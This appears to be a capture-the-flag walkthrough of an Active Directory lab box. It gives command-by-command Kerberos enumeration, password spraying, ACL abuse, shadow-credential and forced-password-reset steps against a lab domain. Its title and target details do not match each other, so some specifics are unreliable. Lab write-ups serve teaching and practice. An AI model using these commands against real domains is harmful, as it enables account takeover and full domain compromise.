# HTB: Forest

Forest is an Active Directory machine that focuses on **Kerberos enumeration**, **password spraying**, **BloodHound analysis**, and **ACL / AD CS abuse** to achieve full domain compromise.

**Target IP:** `10.10.10.1`  
**Domain:** `infiltrator.htb`  
**DC Hostname:** `dc01.infiltrator.htb`

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -oA nmap/forest -vv 10.10.10.1
````

---

### Hosts File

Add the fully qualified domain name:

```text
10.10.10.1 dc01.infiltrator.htb infiltrator.htb dc01
```

---

## Web Enumeration (User Harvesting)

The website contains an **Employees** section listing names.

Extract usernames from `<h4>` tags:

```bash
curl -s -q 10.10.10.1 | grep -oP 'h4>.[0-9]* \K(.*?)(?=h)'
```

Save the names to `potential_users.txt`.

Generate username permutations:

```bash
username-anarchy -i potential_users.txt
```

---

## Kerberos User Enumeration (kerbrute)

Check which users are valid:

```bash
kerbrute userenum --dc 10.10.10.1 -d infiltrator.htb potential_users.txt
```

If hashes are `$18` (AES, not crackable), downgrade:

```bash
kerbrute userenum --dc 10.10.10.1 -d infiltrator.htb --downgrade potential_users.txt
```

If `$23` hashes are returned, crack them with Hashcat.

## Credential Validation (netexec / nxc)

Validate credentials:

```bash
nxc smb 10.10.10.1 -u l.clark -p whatismypass!
```

List domain users:

```bash
nxc smb 10.10.10.1 -u l.clark -p whatismypass! --users
```

A password for `k.turner` was discovered.

## Password Spraying

Prepare:

* `users.txt`
* `passwords.txt`

Run password spraying:

```bash
nxc smb 10.10.10.1 -u users.txt -p passwords.txt
```

Kerberos-based spraying:

```bash
nxc smb 10.10.10.1 -k -u l.clark -p whatismypass! --continue-on-success
```

Mark owned users in BloodHound:

* `l.clark`
* `d.andreson`

If NTLM login is blocked, use Kerberos:

```bash
nxc smb 10.10.10.1 -k -u d.andreson -p whatismypass! --continue-on-success
```

## BloodHound Analysis

Actions taken:

* Mark `l.clark` and `d.andreson` as **Owned**
* Run:

  * **Shortest Path from Owned Objects**
  * **Shortest Path to High Value Targets**

Findings:

* `andreson` has **GenericAll** on `marketdigital` OU
* `e.rodrigez` can be abused via OU permissions
* `m.harris` can have password reset forced

---

## ACL Abuse (dacledit.py)

Grant `d.andreson` full control over the OU:

```bash
dacledit.py -action write -rights FullControl -inheritance \
-principal d.andreson \
-target-dn "OU=marketdigital,DC=infiltrator,DC=htb" \
-k -dc-ip dc01.infiltrator.htb \
'infiltrator.htb/d.andreson:whatismypass!'
```

---

## AD CS Abuse (certipy)

Create shadow credentials for `e.rodrigez`:

```bash
certipy shadow auto -k -target dc01.infiltrator.htb \
-u d.andreson@infiltrator.htb -p "whatismypass!" \
-account e.rodrigez
```

Copy the NT hash.

---

## Group Membership Abuse (bloodyAD)

Add `e.rodrigez` to the marketing group:

```bash
bloodyAD -u e.rodrigez -p ':<hash>' \
--host dc01.infiltrator.htb \
-d infiltrator.htb \
add groupMember "Marketing" e.rodrigez
```

Force password reset for `m.harris`:

```bash
bloodyAD -u e.rodrigez -p ':<hash>' \
--host dc01.infiltrator.htb \
-d infiltrator.htb \
set password m.harris "password!"
```
